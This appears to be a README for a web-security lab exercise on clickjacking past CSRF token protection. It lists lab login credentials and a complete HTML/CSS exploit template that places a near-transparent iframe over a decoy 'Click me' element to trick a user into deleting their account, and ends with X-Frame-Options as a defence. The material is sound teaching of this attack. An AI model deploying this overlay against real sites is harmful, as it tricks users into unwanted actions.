# Clickjacking Exploit with CSRF Token Protection

This repository contains the project files and documentation for analyzing and exploiting basic clickjacking techniques with CSRF (Cross-Site Request Forgery) token protection. The project demonstrates how to exploit clickjacking vulnerabilities and explores methods to defend against them.

---

## ðŸ“œ Problem Statement

The task is to craft an HTML exploit to manipulate a user's interaction on a decoy website, tricking them into deleting their account on a vulnerable site. The goal is to bypass CSRF token protection using a transparent iframe overlay positioned over the target button.

---

## ðŸ›  Project Objectives

1. **Understand clickjacking techniques**:
   - Learn how iframe overlays can be maliciously used.
2. **Analyze CSRF token protection mechanisms**:
   - Study vulnerabilities in token-based protections.
3. **Craft an HTML exploit**:
   - Develop an iframe-based attack to bypass user awareness.
4. **Demonstrate exploit delivery**:
   - Test the crafted exploit in a controlled environment to achieve account deletion.

## ðŸš€ Steps to Reproduce

### 1. Log in to the Vulnerable Application
- Use the provided credentials:
  - **Username:** wiener
  - **Password:** Peter
- Access the "Delete account" section of the target website.

### 2. Create the Exploit
- Use the following HTML template to craft the exploit:
  ```html
  <style>
      iframe {
          position: relative;
          width: 1000px;
          height: 700px;
          opacity: 0.000001;
          z-index: 2;
      }
      div {
          position: absolute;
          top: 515px;
          left: 60px;
          z-index: 1;
      }
  </style>
  <div>Click me</div>
  <iframe src="YOUR-LAB-ID"></iframe>

ðŸ“– Key Learnings
Technical Insights:

Understanding iframe manipulation for clickjacking attacks.
The role of CSRF tokens in securing user actions.
Practical application of HTML and CSS in crafting exploits.
Defense Mechanisms:

Use of X-Frame-Options headers to prevent embedding in iframes.
